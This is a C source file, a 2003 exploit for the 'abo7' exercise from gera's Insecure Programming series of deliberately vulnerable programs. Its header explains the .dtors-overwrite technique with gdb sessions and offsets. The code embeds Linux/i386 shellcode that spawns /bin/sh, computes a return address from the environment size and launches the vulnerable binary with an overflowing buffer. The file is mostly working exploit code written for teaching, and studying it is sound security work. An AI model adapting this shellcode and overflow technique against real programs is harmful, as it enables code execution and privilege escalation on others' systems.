/*
 * $Id: abo7-ex.c,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
 *
 * abo7-ex.c - abo7.c exploit, for educational purposes
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * See http://community.core-sdi.com/~gera/InsecureProgramming/
 *
 * This exploit wasn't so straight-forward with the newer gcc compilers
 * (tested on gcc-2.95.3), due to dynamic section position, between .data
 * (where our initialized buffer is located) and .dtors sections.
 *
 * $ size -A -x abo7
 * [...]
 * .data             0x120   0x8049480
 * .eh_frame           0x4   0x80495a0
 * .dynamic           0xc8   0x80495a4
 * .ctors              0x8   0x804966c
 * .dtors              0x8   0x8049674
 * [...]
 *
 * On older compilers, the .dynamic section is placed after the .got section.
 * Anyway i've managed to write a working exploit that puts shellcode in the
 * argument vector *argv[]. RET is therefore calculated considering the
 * enviroment size. It also works with older compilers (tested on egcs-2.91.66,
 * gcc-2.95.2, and gcc-2.7.2.3).
 *
 * $ ./abo7-ex 
 * Using env size: 980
 * Using offset for .dtors: 477
 * Using ret: 0xBFFFFC08
 * sh-2.05a$ 
 *
 * $ gdb abo7 -q
 * (gdb) set arg `perl -e 'print "\x0e\xfc\xff\xbf"x119'`
 * (gdb) r
 * [...]
 * Program received signal SIGILL, Illegal instruction.
 * 0xbffffc15 in ?? ()
 * (gdb) p &buf
 * $1 = (<data variable, no debug info> *) 0x80494a0
 * (gdb) p (0x8049674 - 0x80494a0 + 4 + 4)
 * $2 = 476
 * (gdb) p (476/4)
 * $3 = 119
 * (gdb) x/2 0x8049674
 * 0x8049674 <__DTOR_LIST__>:      0xbffffc0e      0xbffffc0e
 *
 * NOTE. If it doesn't work, try setting LD_BIND_NOW=1 in environment
 * (see http://www.securityfocus.com/archive/82/323725).
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF 	477	// 119*4 + 1 (offset for .dtors section)

char sc[] = /* linux/i386 shellcode */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char buf[BUF];
	int i, ret;

	/* address pointer */
	int *ap = (int *)(buf);

	/* user environment */
	extern char **environ;
	char **ep;
	int env_size = 0;

	ep = environ;
	while (*ep) {
		env_size += strlen(*ep);
		ep++;
		env_size++;
	}

	/* calculate the ret address */
	ret = 0xbffffffa - strlen(sc) - strlen("./abo7") - env_size;

	fprintf(stderr, "Using env size: %d\n", env_size);
	fprintf(stderr, "Using offset for .dtors: %d\n", BUF);
	fprintf(stderr, "Using ret: 0x%X\n", ret);

	/* prepare buf for the overflow with the ret address */
	for (i = 0; i < BUF - 1; i += 4)
		*ap++ = ret;
	*ap = 0x0;

	/* run the vulnerable program */
	execl("./abo7", "abo7", buf, sc, NULL);
	perror("execl");
}
